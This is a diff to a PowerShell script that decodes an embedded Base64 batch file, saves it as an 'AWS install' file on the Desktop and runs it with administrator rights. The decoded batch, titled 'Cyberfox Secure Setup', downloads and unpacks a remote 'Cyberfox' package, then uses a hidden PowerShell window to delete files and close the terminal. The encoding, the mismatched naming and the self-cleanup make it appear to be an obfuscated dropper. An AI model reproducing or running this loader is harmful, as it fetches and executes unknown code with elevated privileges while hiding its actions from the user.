@@ -2,7 +2,7 @@
 [CmdletBinding()]
 param()
 
-# Your Base64 encoded batch script embedded here:
+# Embedded Base64 encoded batch script
 $batBase64 = @"
 QGVjaG8gb2ZmDQpUaXRsZSBDeWJlcmZveCBTZWN1cmUgU2V0dXANCnNldGxvY2FsIGVuYWJs
 ZWRlbGF5ZWRleHBhbnNpb24NCg0KOjogQ29uZmlndXJhdGlvbg0Kc2V0ICJiYXRfZGlyPSV+
@@ -35,7 +35,7 @@ blJBUi5leGUiIC92ZSAyXj5udWwgXnwgZmluZCAiUkVHX1NaIicpIGRvICgNCiAgICAgICAgICAgIHNl
 gICAgICAgICkNCiAgICApDQoNCjo6IEZhbGxiYWNrDQppZiBub3QgZGVmaW5lZCB3aW5yYXJfZXhl
 KA0KICAgIHNldCAid2lucmFyX2V4ZT0lUHJvZ3JhbUZpbGVzXFxXaW5SQVJcV2luUkFSLmV4ZSIpDQp9DQoNCjo6IEZpbmFsIHZlcmlm
 aWNhdGlvbg0KZWNobyBbSU5GT10gVmVyaWZ5aW5nIFdpblJBUiBhdDogIXdpbnJhcl9leGUhDQppZiBub3QgZXhpc3QgIXdpbnJhcl9leGUh
-KA0KICAgIGVjaG8gW0VSUk9SXS BXaW5SQVIgbm90IGZvdW5kIGF0OiAhd2lucmFyX2V4ZQ0KICAgIGVjaG8gW0FDVElPTl0gUGxlYXNlIGlu
+KA0KICAgIGVjaG8gW0VSUk9SXSBXaW5SQVIgbm90IGZvdW5kIGF0OiAhd2lucmFyX2V4ZQ0KICAgIGVjaG8gW0FDVElPTl0gUGxlYXNlIGlu
 c3RhbGwgV2luUkFSSB2b3FpY2VsbHkgYW5kIHJlLXJ1biB0aGlzIHNjcmlwdC4NCiAgICBleGl0IC9iDQp9DQoNCjo6ID09PSBEb3dubG9
 hZCBDeWJlcmZveCBaSVAgPT09DQplY2hvIFtTVEVQXSBEb3dubG9hZGluZyBDeWJlcmZveCBwYWNrYWdlLi4uDQpwb3dlcnNoZWxsIC1Db
 21tYW5kICJJbnZva2UtV2ViUmVxdWVzdCAtVXJpICclY3liZXJmb3hfdXJsJScgLU91dEZpbGUgJyVjeWJlcmZveF96aXAnJyAtVXNlQmF
@@ -53,33 +53,19 @@ Rvd1N0eWxlIEhpZGRlbiAtQ29tbWFuZCAnU3RhcnQtU2xlZXAgLVNlY29uZHMgNSBSZW1vdmUtSXRlbS
 b3JjZQ0KDQo6OiBDbG9zZSB0ZXJtaW5hbCBpbW1lZGlhdGVseQ0KZXhpdA==
 "@
 
-# Get desktop path dynamically
 $desktopPath = [Environment]::GetFolderPath("Desktop")
+$awsFolder = Join-Path $desktopPath "AWS"
+if (-not (Test-Path $awsFolder)) { New-Item -Path $awsFolder -ItemType Directory | Out-Null }
 
-# Define AWS folder path on desktop
-$awsFolder = Join-Path -Path $desktopPath -ChildPath "AWS"
-
-# Create AWS folder if it does not exist
-if (-not (Test-Path -Path $awsFolder -PathType Container)) {
-    New-Item -Path $awsFolder -ItemType Directory | Out-Null
-}
-
-# Define full path for the batch file inside the AWS folder with timestamp
-$batFile = Join-Path -Path $awsFolder -ChildPath "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"
+$batFile = Join-Path $awsFolder "aws-install-$(Get-Date -Format 'yyyyMMddHHmmss').bat"
 
 try {
-    # Decode the Base64 batch content and write to file
     $bytes = [Convert]::FromBase64String($batBase64)
     [IO.File]::WriteAllBytes($batFile, $bytes)
 
     Write-Host "Batch script extracted to: $batFile" -ForegroundColor Cyan
 
-    # Run the batch file elevated
     Start-Process -FilePath $batFile -Verb RunAs
-
-    # Optionally, delete the batch file after some delay (uncomment if you want)
-    # Start-Sleep -Seconds 10
-    # Remove-Item -Path $batFile -Force
 
 } catch {
     Write-Host "[ERROR] Failed to extract or run batch script: $_" -ForegroundColor Red
